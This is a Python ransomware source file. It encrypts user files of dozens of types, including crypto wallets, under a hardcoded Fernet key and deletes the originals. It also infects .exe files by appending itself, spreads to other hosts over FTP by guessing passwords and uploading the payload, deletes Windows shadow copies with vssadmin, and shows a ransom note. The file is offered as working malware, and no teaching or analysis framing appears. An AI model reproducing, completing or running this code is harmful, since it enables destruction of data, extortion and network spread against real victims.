#!/usr/bin/python3.8
from time import *
from Components.drive_propagation import *
from Gui.gui import *
from Components.ransom_note import *

import sys
import nmap
from cryptography.fernet import Fernet


status = 'INFECTED'


f_name = []
targets = ('.txt', '.docx', '.doc', '.lnk', '.xlsx', '.pdf', '.zip', '.ppt',
           '.jpg', '.jpeg', 'gif', '.mp3', '.mp4', '.svg', '.ico', '.3gp',
           'ink', '.gz', '.rar', '.wav', '.iso', '.java', '.html', '.css',
           '.key', '.enc', '.png', 'wallet.dat', '.cvs', '.bak', '.xls', '.odt',
           '.rtf', '.tex', '.7z', '.deb', '.rmp', '.z', '.pkg', '.bin',
           '.dmg', '.toast', '.db', '.dbf', '.log', '.mdb', '.sav', '.xml',
           '.xhtml', '.htm', '.email', '.eml', '.msg', '.ost', '.pst', '.vcf',
           '.jar', '.bat', '.cgi', '.msi', '.gadget', '.tiff', '.tif', '.ai',
           '.asp', '.aspx', '.odp', '.pptx', '.ods', '.rtx', '.avi', '.wmv')


def virus_property():
    # Infect files in current user
    target = '.exe'
    path = 'C:\\'
    for r, d, files in os.walk(path):
        for file in files:
            if file.endswith(target):
                try:
                    with open(file, 'ab+') as g:
                        line = g.read()
                        if status not in line:
                            g.seek(0, 0)
                            with open(sys.argv[0], 'rb+') as c:
                                line = c.read()
                                g.write('\n' + line)
                                g.close()
                                c.close()
                                os.chmod(file, 0o777)
                        else:
                            pass
                except Exception:
                    pass
        break


def find_file():
    # Get files to encrypt from current user
    path = 'C:\\'
    for r, d, files in os.walk(path):
        for file in files:
            if file.endswith(targets):
                f_name.append(os.path.join(r, file))
                print(f_name)
                break


def encrypt_file():
    key = "aWC5hXgG06c4lCmPpWxEuczPacxTa1TId-yw3hjZI9E="
    for fn in f_name:
        k = key
        f = Fernet(k)
        try:
            with open(fn, "rb") as file:
                file_data = file.read()
                encrypted_data = f.encrypt(file_data)
            with open(fn + '.crypy', "wb") as file:
                file.write(encrypted_data)
                print(file)
                os.remove(fn)
        except Exception:
            pass


def ftp_spread():
    # Spread through ftp
    nm = nmap.PortScanner
    hosts = nm.all_hosts()
    password = open('nmap.lst', 'r+').read().split('\n')
    for host in hosts:
        try:
            subprocess.run(f'ftp -A {host}', shell=True)
        except Exception:
            pass
        else:
            for pw in password:
                try:
                    subprocess.run(f'user {pw}', shell=True)
                except Exception:
                    pass
                else:
                    subprocess.run('binary', shell=True)
                    subprocess.run('put ransomware.exe', shell=True)
                    subprocess.run('quit', shell=True)
                    break


def dlt_shadow_copy():
    try:
        os.system('vssadmin Delete Shadows /All /Quiet')
    except Exception:
        pass


def delete_ransomware():
    path = 'C:\\'
    ransomware = sys.argv[0]
    try:
        for r, d, files in os.walk(path):
            for file in files:
                if file.endswith(ransomware):
                    os.remove(file)
    except Exception:
        pass


def main():
    # hide = win32gui.GetForegroundWindow()
    # win32gui.ShowWindow(hide, win32con.SW_HIDE)
    sleep(5)
    virus_property()
    sleep(5)
    # find_file()
    # encrypt_file()
    spread()
    find_shared_file()
    encrypt_shared_file()
    gui()
    ransom_note()
    show_ransom_note()
    sleep(5)
    # ftp_spread()
    # dlt_shadow_copy()
    # delete_ransomware()


if __name__ == "__main__":
    main()
